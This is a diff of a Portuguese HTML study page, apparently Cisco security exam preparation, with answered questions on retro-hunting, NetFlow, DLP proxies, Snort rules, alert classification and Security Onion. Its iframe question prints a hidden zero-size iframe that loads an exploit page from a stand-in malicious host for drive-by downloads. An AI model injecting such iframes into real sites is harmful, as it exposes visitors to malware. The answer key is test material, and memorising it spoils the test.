+              <strong>❓ Pergunta:</strong> Benefício de realizar análise
+              retrospectiva após identificar malware?
+            </div>
+            <div class="row g-4">
+              <div class="col-md-6">
+                <div class="p-3 bg-secondary bg-opacity-25 rounded-3 h-100">
+                  <h4 class="text-success mb-3">
+                    <i class="fas fa-check-circle"></i> ✅ Resposta Correta
+                  </h4>
+                  <p class="fs-5 fw-bold text-white">
+                    Rastrear o comportamento do malware a partir do ponto de
+                    identificação.
+                  </p>
+                  <p>
+                    <strong>🔬 Por quê?</strong> A análise retrospectiva
+                    (retro-hunting) utiliza dados históricos (logs, NetFlow,
+                    PCAPs) para <strong>reconstruir a linha do tempo</strong> da
+                    infecção. Isso permite ver o que o malware fez antes e
+                    depois da detecção, movimentos laterais e dados acessados.
+                  </p>
+                </div>
+              </div>
+              <div class="col-md-6">
+                <div class="p-3 bg-dark rounded-3 h-100">
+                  <h5><i class="fas fa-history"></i> Exemplo Prático</h5>
+                  <p>
+                    Após um alerta de Trojan, o analista busca nos logs de proxy
+                    por conexões suspeitas nas últimas 48h, descobrindo que o
+                    malware já havia exfiltrado dados 12h antes do alerta.
+                  </p>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Questão 7 -->
+          <div class="content-card-gradient mb-4" id="q7">
+            <div
+              class="d-flex justify-content-between align-items-start flex-wrap mb-3"
+            >
+              <h3 class="card-title mb-0">📌 Questão 7: iFrames Maliciosos</h3>
+              <span class="badge-cisco-alt">Web Security</span>
+            </div>
+            <div class="alert-cisco mb-3">
+              <strong>❓ Pergunta:</strong> Qual protocolo é explorado por
+              cibercriminosos que criam iFrames maliciosos?
+            </div>
+            <div class="row g-4">
+              <div class="col-md-6">
+                <div class="p-3 bg-secondary bg-opacity-25 rounded-3 h-100">
+                  <h4 class="text-success mb-3">
+                    <i class="fas fa-check-circle"></i> ✅ Resposta Correta
+                  </h4>
+                  <p class="fs-5 fw-bold text-white">HTTP</p>
+                  <p>
+                    <strong>🔬 Por quê?</strong> O iFrame é uma tag HTML que
+                    carrega outro documento via <strong>HTTP/HTTPS</strong>. Ao
+                    injetar
+                    <code>&lt;iframe src="http://site-malicioso.com"&gt;</code>,
+                    o atacante força o navegador a fazer uma requisição HTTP
+                    para o servidor malicioso, baixando payloads ou
+                    redirecionando a vítima.
+                  </p>
+                </div>
+              </div>
+              <div class="col-md-6">
+                <div class="p-3 bg-dark rounded-3 h-100">
+                  <h5><i class="fas fa-code"></i> Exemplo de Injeção</h5>
+                  <div class="terminal-card">
+                    &#60;iframe src="http://malware.com/exploit.html" width="0"
+                    height="0" frameborder="0"&#62;&#60;/iframe&#62;
+                  </div>
+                  <p class="mt-2 small text-muted">
+                    iFrame invisível usado para drive-by-download.
+                  </p>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Questão 9 -->
+          <div class="content-card-gradient mb-4" id="q9">
+            <div
+              class="d-flex justify-content-between align-items-start flex-wrap mb-3"
+            >
+              <h3 class="card-title mb-0">
+                📌 Questão 9: NetFlow vs Wireshark
+              </h3>
+              <span class="badge-cisco-alt">Ferramentas de Análise</span>
+            </div>
+            <div class="alert-cisco mb-3">
+              <strong>❓ Pergunta:</strong> Principal diferença entre dados
+              capturados pelo NetFlow e pelo Wireshark?
+            </div>
+            <div class="row g-4">
+              <div class="col-md-6">
+                <div class="p-3 bg-secondary bg-opacity-25 rounded-3 h-100">
+                  <h4 class="text-success mb-3">
+                    <i class="fas fa-check-circle"></i> ✅ Resposta Correta
+                  </h4>
+                  <p class="fs-5 fw-bold text-white">
+                    NetFlow coleta metadados; Wireshark captura pacotes
+                    completos.
+                  </p>
+                  <p>
+                    <strong>🔬 Por quê?</strong> <strong>NetFlow</strong> resume
+                    o tráfego em "flows" (5-tuplas, bytes, pacotes) – ideal para
+                    visão macro e tendências. <strong>Wireshark</strong> faz
+                    <strong>captura de pacote completo (PCAP)</strong>,
+                    incluindo payload, permitindo inspeção forense detalhada.
+                  </p>
+                </div>
+              </div>
+              <div class="col-md-6">
+                <div class="p-3 bg-dark rounded-3 h-100">
+                  <h5>
+                    <i class="fas fa-chart-line"></i> Quando usar cada um?
+                  </h5>
+                  <ul class="styled-list">
+                    <li>
+                      <strong>NetFlow:</strong> Monitoramento de tráfego,
+                      detecção de anomalias, faturamento.
+                    </li>
+                    <li>
+                      <strong>Wireshark:</strong> Análise de problemas pontuais,
+                      reconstrução de sessões, forense.
+                    </li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Questão 10 -->
+          <div class="content-card-gradient mb-4" id="q10">
+            <div
+              class="d-flex justify-content-between align-items-start flex-wrap mb-3"
+            >
+              <h3 class="card-title mb-0">📌 Questão 10: Proxy DLP</h3>
+              <span class="badge-cisco-alt">Prevenção de Perda de Dados</span>
+            </div>
+            <div class="alert-cisco mb-3">
+              <strong>❓ Pergunta:</strong> Como um proxy da Web fornece DLP?
+            </div>
+            <div class="row g-4">
+              <div class="col-md-6">
+                <div class="p-3 bg-secondary bg-opacity-25 rounded-3 h-100">
+                  <h4 class="text-success mb-3">
+                    <i class="fas fa-check-circle"></i> ✅ Resposta Correta
+                  </h4>
+                  <p class="fs-5 fw-bold text-white">
+                    Escaneando e registrando tráfego de saída.
+                  </p>
+                  <p>
+                    <strong>🔬 Por quê?</strong> O proxy inspeciona o
+                    <strong>tráfego de saída (egresso)</strong> em busca de
+                    padrões de dados sensíveis (CPF, cartão de crédito,
+                    documentos confidenciais). Se detectado, bloqueia ou gera
+                    alerta, evitando a exfiltração.
+                  </p>
+                </div>
+              </div>
+              <div class="col-md-6">
+                <div class="p-3 bg-dark rounded-3 h-100">
+                  <h5><i class="fas fa-search"></i> Tecnologias Envolvidas</h5>
+                  <p>
+                    Regex, Fingerprinting de documentos, Machine Learning para
+                    classificação de conteúdo.
+                  </p>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Questão 11 -->
+          <div class="content-card-gradient mb-4" id="q11">
+            <div
+              class="d-flex justify-content-between align-items-start flex-wrap mb-3"
+            >
+              <h3 class="card-title mb-0">
+                📌 Questão 11: Serviços do NetFlow
+              </h3>
+              <span class="badge-cisco-alt">Monitoramento & Billing</span>
+            </div>
+            <div class="alert-cisco mb-3">
+              <strong>❓ Pergunta:</strong> Quais dois serviços são fornecidos
+              pelo NetFlow?
+            </div>
+            <div class="row g-4">
+              <div class="col-md-6">
+                <div class="p-3 bg-secondary bg-opacity-25 rounded-3 h-100">
+                  <h4 class="text-success mb-3">
+                    <i class="fas fa-check-circle"></i> ✅ Respostas Corretas
+                  </h4>
+                  <p>
+                    <span class="badge-cisco me-2">Monitoramento de rede</span>
+                    <span class="badge-cisco">Faturamento baseado no uso</span>
+                  </p>
+                  <p>
+                    <strong>🔬 Por quê?</strong> O NetFlow fornece visibilidade
+                    de tráfego em tempo real (<strong>monitoramento</strong>) e
+                    coleta dados de consumo (bytes/pacotes), permitindo que ISPs
+                    ou departamentos de TI <strong>faturem</strong> clientes ou
+                    setores internos pelo uso da rede.
+                  </p>
+                </div>
+              </div>
+              <div class="col-md-6">
+                <div class="p-3 bg-dark rounded-3 h-100">
+                  <h5><i class="fas fa-chart-simple"></i> Aplicações Comuns</h5>
+                  <ul class="styled-list">
+                    <li>Detecção de picos de largura de banda.</li>
+                    <li>Identificação de top falantes (top talkers).</li>
+                    <li>Modelos de cobrança por tráfego em provedores.</li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Questão 12 -->
+          <div class="content-card-gradient mb-4" id="q12">
+            <div
+              class="d-flex justify-content-between align-items-start flex-wrap mb-3"
+            >
+              <h3 class="card-title mb-0">
+                📌 Questão 12: Tipos de Dados de Monitoramento
+              </h3>
+              <span class="badge-cisco-alt">Classificação de Dados</span>
+            </div>
+            <div class="alert-cisco mb-3">
+              <strong>❓ Pergunta:</strong> Combine o tipo de dados de
+              monitoramento de rede com a descrição.
+            </div>
+            <div class="table-responsive">
+              <table class="table-cisco">
+                <thead>
+                  <tr>
+                    <th>Descrição</th>
+                    <th>Categoria</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>
+                      Usado para descrever e analisar fluxo de rede ou dados de
+                      desempenho
+                    </td>
+                    <td><span class="badge-cisco">Dados Estatísticos</span></td>
+                  </tr>
+                  <tr>
+                    <td>
+                      Gerado por IPS/IDS quando tráfego suspeito é detectado
+                    </td>
+                    <td><span class="badge-cisco">Dados de Alerta</span></td>
+                  </tr>
+                  <tr>
+                    <td>
+                      Contém 5-tuplas, dados transmitidos, duração (NetFlow)
+                    </td>
+                    <td><span class="badge-cisco">Dados de Sessão</span></td>
+                  </tr>
+                  <tr>
+                    <td>Logs de servidor e host específicos do dispositivo</td>
+                    <td><span class="badge-cisco">Dados de Transação</span></td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </div>
+
+          <!-- Questão 13 -->
+          <div class="content-card-gradient mb-4" id="q13">
+            <div
+              class="d-flex justify-content-between align-items-start flex-wrap mb-3"
+            >
+              <h3 class="card-title mb-0">
+                📌 Questão 13: Appliance Cisco para Reputação
+              </h3>
+              <span class="badge-cisco-alt">Cisco WSA</span>
+            </div>
+            <div class="alert-cisco mb-3">
+              <strong>❓ Pergunta:</strong> Qual appliance Cisco filtra tráfego
+              baseado na reputação do servidor Web?
+            </div>
+            <div class="row g-4">
+              <div class="col-md-6">
+                <div class="p-3 bg-secondary bg-opacity-25 rounded-3 h-100">
+                  <h4 class="text-success mb-3">
+                    <i class="fas fa-check-circle"></i> ✅ Resposta Correta
+                  </h4>
+                  <p class="fs-5 fw-bold text-white">
+                    WSA (Web Security Appliance)
+                  </p>
+                  <p>
+                    <strong>🔬 Por quê?</strong> O
+                    <strong>Cisco WSA</strong> atua como proxy web e utiliza o
+                    <strong>Web Reputation Score (WBRS)</strong> para
+                    classificar URLs. Baseado nessa pontuação, ele pode
+                    permitir, escanear ou bloquear o acesso, protegendo contra
+                    malware e C2.
+                  </p>
+                </div>
+              </div>
+              <div class="col-md-6">
+                <div class="p-3 bg-dark rounded-3 h-100">
+                  <h5><i class="fas fa-server"></i> Outros Appliances</h5>
+                  <ul class="styled-list">
+                    <li><strong>ASA:</strong> Firewall de rede.</li>
+                    <li>
+                      <strong>ESA:</strong> Segurança de e-mail (Email Security
+                      Appliance).
+                    </li>
+                    <li>
+                      <strong>AVC:</strong> Visibilidade de aplicativos
+                      (Application Visibility and Control).
+                    </li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Questão 14 -->
+          <div class="content-card-gradient mb-4" id="q14">
+            <div
+              class="d-flex justify-content-between align-items-start flex-wrap mb-3"
+            >
+              <h3 class="card-title mb-0">📌 Questão 14: lsass.exe suspeito</h3>
+              <span class="badge-cisco-alt">Análise de Processos</span>
+            </div>
+            <div class="alert-cisco mb-3">
+              <strong>❓ Pergunta:</strong> Administrador encontra lsass.exe em
+              Arquivos de Programas. O que fazer?
+            </div>
+            <div class="row g-4">
+              <div class="col-md-6">
+                <div class="p-3 bg-secondary bg-opacity-25 rounded-3 h-100">
+                  <h4 class="text-success mb-3">
+                    <i class="fas fa-check-circle"></i> ✅ Resposta Correta
+                  </h4>
+                  <p class="fs-5 fw-bold text-white">
+                    Excluir, pois é provavelmente malware.
+                  </p>
+                  <p>
+                    <strong>🔬 Por quê?</strong> O
+                    <strong>lsass.exe legítimo</strong> reside em
+                    <code>C:\Windows\System32</code>. Qualquer cópia em outro
+                    diretório (como Program Files) é quase certamente um
+                    <strong>malware disfarçado</strong>, tentando enganar o
+                    administrador ou usuário.
+                  </p>
+                </div>
+              </div>
+              <div class="col-md-6">
+                <div class="p-3 bg-dark rounded-3 h-100">
+                  <h5><i class="fas fa-skull"></i> Perigo</h5>
+                  <p>
+                    Encerrar o processo legítimo do lsass causa uma falha
+                    crítica (tela azul). Por isso, é crucial verificar o caminho
+                    do arquivo antes de qualquer ação.
+                  </p>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Questão 15 -->
+          <div class="content-card-gradient mb-4" id="q15">
+            <div
+              class="d-flex justify-content-between align-items-start flex-wrap mb-3"
+            >
+              <h3 class="card-title mb-0">
+                📌 Questão 15: Cisco Cognitive Intelligence
+              </h3>
+              <span class="badge-cisco-alt">Machine Learning</span>
+            </div>
+            <div class="alert-cisco mb-3">
+              <strong>❓ Pergunta:</strong> Que tipo de dados o Cisco Cognitive
+              Intelligence usa para encontrar atividades maliciosas?
+            </div>
+            <div class="row g-4">
+              <div class="col-md-6">
+                <div class="p-3 bg-secondary bg-opacity-25 rounded-3 h-100">
+                  <h4 class="text-success mb-3">
+                    <i class="fas fa-check-circle"></i> ✅ Resposta Correta
+                  </h4>
+                  <p class="fs-5 fw-bold text-white">Dados Estatísticos</p>
+                  <p>
+                    <strong>🔬 Por quê?</strong> A ferramenta cria uma
+                    <strong>baseline estatística</strong> do comportamento
+                    normal da rede e identifica desvios (anomalias) usando
+                    modelos matemáticos. Isso permite detectar tráfego C2 que
+                    burlou outras defesas.
+                  </p>
+                </div>
+              </div>
+              <div class="col-md-6">
+                <div class="p-3 bg-dark rounded-3 h-100">
+                  <h5><i class="fas fa-brain"></i> Conceito</h5>
+                  <p>
+                    Em vez de regras fixas (determinístico), a abordagem
+                    estatística aprende o que é "normal" e flagra comportamentos
+                    fora do padrão, como exfiltração de dados em horários
+                    incomuns.
+                  </p>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Questão 16 -->
+          <div class="content-card-gradient mb-4" id="q16">
+            <div
+              class="d-flex justify-content-between align-items-start flex-wrap mb-3"
+            >
+              <h3 class="card-title mb-0">📌 Questão 16: Logs do Windows</h3>
+              <span class="badge-cisco-alt">Sysinternals & Event Viewer</span>
+            </div>
+            <div class="alert-cisco mb-3">
+              <strong>❓ Pergunta:</strong> Corresponda o log do Windows às
+              mensagens.
+            </div>
+            <div class="table-responsive">
+              <table class="table-cisco">
+                <thead>
+                  <tr>
+                    <th>Descrição</th>
+                    <th>Categoria</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>Eventos registrados por vários aplicativos</td>
+                    <td><span class="badge-cisco">Logs de Aplicativo</span></td>
+                  </tr>
+                  <tr>
+                    <td>
+                      Informações sobre instalação de software, incluindo
+                      updates do Windows
+                    </td>
+                    <td>
+                      <span class="badge-cisco"
+                        >Logs de Configuração (Setup)</span
+                      >
+                    </td>
+                  </tr>
+                  <tr>
+                    <td>
+                      Eventos relacionados a tentativas de login e acesso a
+                      arquivos
+                    </td>
+                    <td><span class="badge-cisco">Logs de Segurança</span></td>
+                  </tr>
+                  <tr>
+                    <td>Eventos de drivers, processos e hardware</td>
+                    <td>
+                      <span class="badge-cisco">Registros de Sistema</span>
+                    </td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </div>
+
+          <!-- Questão 18 -->
+          <div class="content-card-gradient mb-4" id="q18">
+            <div
+              class="d-flex justify-content-between align-items-start flex-wrap mb-3"
+            >
+              <h3 class="card-title mb-0">
+                📌 Questão 18: Origens das Regras Snort
+              </h3>
+              <span class="badge-cisco-alt">IDS/IPS Ruleset</span>
+            </div>
+            <div class="alert-cisco mb-3">
+              <strong>❓ Pergunta:</strong> Corresponda a origem da regra Snort
+              à descrição.
+            </div>
+            <div class="table-responsive">
+              <table class="table-cisco">
+                <thead>
+                  <tr>
+                    <th>Descrição</th>
+                    <th>Regras</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>Regras mais antigas criadas pelo Sourcefire</td>
+                    <td><span class="badge-cisco">VRT</span></td>
+                  </tr>
+                  <tr>
+                    <td>Regras criadas e mantidas pelo Cisco Talos</td>
+                    <td><span class="badge-cisco">VRT (ou Talos)</span></td>
+                  </tr>
+                  <tr>
+                    <td>Regras de código aberto sob licença BSD</td>
+                    <td><span class="badge-cisco">GPL</span></td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="alert-cisco mt-2">
+              <i class="fas fa-info-circle"></i> Nota: As regras
+              <strong>VRT (Vulnerability Research Team)</strong> foram
+              originalmente do Sourcefire e agora são mantidas pelo
+              <strong>Cisco Talos</strong>. As regras
+              <strong>ET (Emerging Threats)</strong> são da Proofpoint, e as
+              <strong>GPL</strong> são as regras comunitárias de código aberto.
+            </div>
+          </div>
+
+          <!-- Questão 20 -->
+          <div class="content-card-gradient mb-4" id="q20">
+            <div
+              class="d-flex justify-content-between align-items-start flex-wrap mb-3"
+            >
+              <h3 class="card-title mb-0">
+                📌 Questão 20: Seção de Opções do Snort
+              </h3>
+              <span class="badge-cisco-alt">Estrutura de Regras</span>
+            </div>
+            <div class="alert-cisco mb-3">
+              <strong>❓ Pergunta:</strong> Que informações estão contidas na
+              seção de opções de uma regra Snort?
+            </div>
+            <div class="row g-4">
+              <div class="col-md-6">
+                <div class="p-3 bg-secondary bg-opacity-25 rounded-3 h-100">
+                  <h4 class="text-success mb-3">
+                    <i class="fas fa-check-circle"></i> ✅ Resposta Correta
+                  </h4>
+                  <p class="fs-5 fw-bold text-white">
+                    Texto descrevendo o evento
+                  </p>
+                  <p>
+                    <strong>🔬 Por quê?</strong> A seção de
+                    <strong>opções</strong> (entre parênteses) contém detalhes
+                    como <code>msg:"Ataque X detectado"</code>,
+                    <code>content:"..."</code>, <code>sid:1000001</code>. O
+                    cabeçalho, por outro lado, define ação, IPs, portas e
+                    direção.
+                  </p>
+                </div>
+              </div>
+              <div class="col-md-6">
+                <div class="p-3 bg-dark rounded-3 h-100">
+                  <h5><i class="fas fa-code"></i> Exemplo de Regra</h5>
+                  <div class="terminal-card small">
+                    alert tcp any any -> 192.168.1.0/24 80 (msg:"Acesso WEB
+                    detectado"; content:"GET"; sid:1000001;)
+                  </div>
+                  <p class="mt-2">
+                    <span class="text-success">msg</span> está nas opções.
+                  </p>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Questão 21 -->
+          <div class="content-card-gradient mb-4" id="q21">
+            <div
+              class="d-flex justify-content-between align-items-start flex-wrap mb-3"
+            >
+              <h3 class="card-title mb-0">
+                📌 Questão 21: Classificação de Alertas
+              </h3>
+              <span class="badge-cisco-alt">Verdadeiro Positivo</span>
+            </div>
+            <div class="alert-cisco mb-3">
+              <strong>❓ Pergunta:</strong> Qual classificação indica que um
+              alerta é verificado como incidente real?
+            </div>
+            <div class="row g-4">
+              <div class="col-md-6">
+                <div class="p-3 bg-secondary bg-opacity-25 rounded-3 h-100">
+                  <h4 class="text-success mb-3">
+                    <i class="fas fa-check-circle"></i> ✅ Resposta Correta
+                  </h4>
+                  <p class="fs-5 fw-bold text-white">
+                    Positivo Real (Verdadeiro Positivo)
+                  </p>
+                  <p>
+                    <strong>🔬 Por quê?</strong> Na matriz de confusão:<br />
+                    - <strong>Verdadeiro Positivo:</strong> Alerta gerado +
+                    Incidente real.<br />
+                    - Falso Positivo: Alerta gerado + Sem incidente.<br />
+                    - Falso Negativo: Sem alerta + Incidente real.<br />
+                    - Verdadeiro Negativo: Sem alerta + Sem incidente.
+                  </p>
+                </div>
+              </div>
+              <div class="col-md-6">
+                <div class="p-3 bg-dark rounded-3 h-100">
+                  <h5><i class="fas fa-chart-pie"></i> Matriz de Confusão</h5>
+                  <div class="diagram-box text-center">
+                    ✅ TP (Alerta correto) | ❌ FP (Falso alarme)<br />❌ FN
+                    (Perdeu o ataque) | ✅ TN (Silêncio correto)
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Questão 22 -->
+          <div class="content-card-gradient mb-4" id="q22">
+            <div
+              class="d-flex justify-content-between align-items-start flex-wrap mb-3"
+            >
+              <h3 class="card-title mb-0">
+                📌 Questão 22: Análise Probabilística
+              </h3>
+              <span class="badge-cisco-alt">Incerteza & Evasão</span>
+            </div>
+            <div class="alert-cisco mb-3">
+              <strong>❓ Pergunta:</strong> Dois cenários onde a análise
+              probabilística é mais adequada?
+            </div>
+            <div class="row g-4">
+              <div class="col-md-6">
+                <div class="p-3 bg-secondary bg-opacity-25 rounded-3 h-100">
+                  <h4 class="text-success mb-3">
+                    <i class="fas fa-check-circle"></i> ✅ Respostas Corretas
+                  </h4>
+                  <ul class="styled-list">
+                    <li>
+                      Quando variáveis aleatórias criam dificuldade em conhecer
+                      o resultado com certeza.
+                    </li>
+                    <li>
+                      Ao analisar aplicativos projetados para contornar
+                      firewalls.
+                    </li>
+                  </ul>
+                  <p>
+                    <strong>🔬 Por quê?</strong> Em cenários de
+                    <strong>incerteza</strong> (randomização, ofuscação),
+                    métodos determinísticos falham. A análise probabilística usa
+                    modelos estatísticos para identificar comportamentos
+                    anômalos típicos de malware evasivo.
+                  </p>
+                </div>
+              </div>
+              <div class="col-md-6">
+                <div class="p-3 bg-dark rounded-3 h-100">
+                  <h5><i class="fas fa-dice-d6"></i> Exemplo</h5>
+                  <p>
+                    Um malware que muda de porta a cada conexão. Uma regra fixa
+                    não detectaria, mas um modelo probabilístico que calcula a
+                    entropia das portas usadas pode flagrar a atividade.
+                  </p>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Questão 23 -->
+          <div class="content-card-gradient mb-4" id="q23">
+            <div
+              class="d-flex justify-content-between align-items-start flex-wrap mb-3"
+            >
+              <h3 class="card-title mb-0">
+                📌 Questão 23: Funções do Security Onion
+              </h3>
+              <span class="badge-cisco-alt"
+                >NSM (Network Security Monitoring)</span
+              >
+            </div>
+            <div class="alert-cisco mb-3">
+              <strong>❓ Pergunta:</strong> Três funções principais do Security
+              Onion?
+            </div>
+            <div class="row g-4">
+              <div class="col-md-12">
+                <div class="p-3 bg-secondary bg-opacity-25 rounded-3">
+                  <h4 class="text-success mb-3">
+                    <i class="fas fa-check-circle"></i> ✅ Respostas Corretas
+                  </h4>
+                  <div class="d-flex flex-wrap gap-2 mb-3">
+                    <span class="badge-cisco">Detecção de intruso</span>
+                    <span class="badge-cisco">Captura de pacote completo</span>
+                    <span class="badge-cisco">Análise de alerta</span>
+                  </div>
+                  <p>
+                    <strong>🔬 Por quê?</strong> O Security Onion é uma
+                    distribuição Linux focada em
+                    <strong>Monitoramento de Segurança de Rede</strong>. Ele
+                    integra Snort/Suricata (detecção), netsniff-ng (PCAP) e ELK
+                    (análise de alertas). Não realiza contenção ativa nem BCP.
+                  </p>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Questão 24 -->
+          <div class="content-card-gradient mb-4" id="q24">
+            <div
+              class="d-flex justify-content-between align-items-start flex-wrap mb-3"
+            >
+              <h3 class="card-title mb-0">📌 Questão 24: Falta de Alerta</h3>
+              <span class="badge-cisco-alt">Falso Negativo</span>
+            </div>
+            <div class="alert-cisco mb-3">
+              <strong>❓ Pergunta:</strong> Agente violou firewall sem ser
+              detectado pelo IDS. Que condição descreve a falta de alerta?
+            </div>
+            <div class="row g-4">
+              <div class="col-md-6">
+                <div class="p-3 bg-secondary bg-opacity-25 rounded-3 h-100">
+                  <h4 class="text-success mb-3">
+                    <i class="fas fa-check-circle"></i> ✅ Resposta Correta
+                  </h4>
+                  <p class="fs-5 fw-bold text-white">Falso Negativo</p>
+                  <p>
+                    <strong>🔬 Por quê?</strong> Houve
+                    <strong>incidente real</strong> (violação), mas o IDS
+                    <strong>não gerou alerta</strong>. Esta é a situação mais
+                    perigosa, pois a equipe de segurança fica às cegas diante de
+                    um ataque em andamento.
+                  </p>
+                </div>
+              </div>
+              <div class="col-md-6">
+                <div class="p-3 bg-dark rounded-3 h-100">
+                  <h5>
+                    <i class="fas fa-exclamation-triangle text-warning"></i>
+                    Prioridade
+                  </h5>
+                  <p>
+                    Em cibersegurança, os falsos negativos são considerados mais
+                    críticos que falsos positivos, pois representam uma falha de
+                    cobertura.
+                  </p>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="mt-5 p-3 bg-dark text-center rounded-3">
+            <i class="fas fa-graduation-cap text-success fs-3 mb-2 d-block"></i>
+            <p class="mb-0">
+              📘 Esta seção faz parte do Mapa de Estudo Cisco. Consulte o
+              material complementar para simulações práticas no Security Onion e
+              regras Snort.
+            </p>
           </div>
         </div>
       </section>
@@ -330,15 +1582,16 @@
         <i class="fas fa-graduation-cap fa-2x text-success mb-3"></i>
         <h3>🎯 Estratégia de Estudo</h3>
         <p class="text-muted">
-          “Entenda o fluxo: quem pode acessar o quê, onde, quando e como. ACLs são a primeira linha, firewalls stateful trazem inteligência,
-          PKI garante confiança.”
+          “Entenda o fluxo: quem pode acessar o quê, onde, quando e como. ACLs
+          são a primeira linha, firewalls stateful trazem inteligência, PKI
+          garante confiança.”
         </p>
         <a
           href="#"
           class="btn-cisco mt-2"
           onclick="
-            window.scrollTo({ top: 0, behavior: 'smooth' })
-            return false
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+            return false;
           "
         >
           <i class="fas fa-arrow-up"></i> Voltar ao topo
@@ -349,8 +1602,11 @@
     <footer>
       <div class="container">
         <div class="footer-credits">
-          <i class="fas fa-shield-alt"></i> Cisco Security Lab | Material de Estudos Baseado em 24 Questões Práticas<br />
-          <span class="text-muted">Domine ACLs, Firewalls, PKI, Segurança em Nuvem e muito mais.</span>
+          <i class="fas fa-shield-alt"></i> Cisco Security Lab | Material de
+          Estudos Baseado em 24 Questões Práticas<br />
+          <span class="text-muted"
+            >Domine ACLs, Firewalls, PKI, Segurança em Nuvem e muito mais.</span
+          >
         </div>
       </div>
     </footer>
@@ -358,12 +1614,15 @@
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
     <script>
       // Progress Bar
-      window.addEventListener('scroll', function () {
-        const winScroll = document.body.scrollTop || document.documentElement.scrollTop
-        const height = document.documentElement.scrollHeight - document.documentElement.clientHeight
-        const scrolled = (winScroll / height) * 100
-        document.getElementById('progressBar').style.width = scrolled + '%'
-      })
+      window.addEventListener("scroll", function () {
+        const winScroll =
+          document.body.scrollTop || document.documentElement.scrollTop;
+        const height =
+          document.documentElement.scrollHeight -
+          document.documentElement.clientHeight;
+        const scrolled = (winScroll / height) * 100;
+        document.getElementById("progressBar").style.width = scrolled + "%";
+      });
     </script>
   </body>
 </html>
